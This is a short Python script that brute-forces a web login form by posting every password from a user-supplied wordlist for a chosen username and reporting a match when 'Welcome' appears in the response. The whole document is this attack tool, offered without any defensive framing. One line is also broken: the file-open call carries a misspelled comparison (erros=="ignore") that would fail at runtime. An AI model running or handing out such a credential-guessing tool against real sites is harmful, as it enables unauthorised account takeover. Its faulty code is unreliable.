import requests
url = input("[?] Enter login url: ")
username = input("[?] Enter username: ")
wordlist_path = input("[?] Enter path to password wordlist: ")
try:
    with open(wordlist_path, "r", erros=="ignore") as file:
        for password in file:
            password = password.strip()
            data = {"username": username, "password": password}
            response = requests.post(url, data=data)
            if "Welcome" in response.text:
                print(f"[✓]password found: {password}")
                break
            else:
                print(f"[-]tried: {password}")
except FileNotFoundError:
    print("[-] wordlist not found")
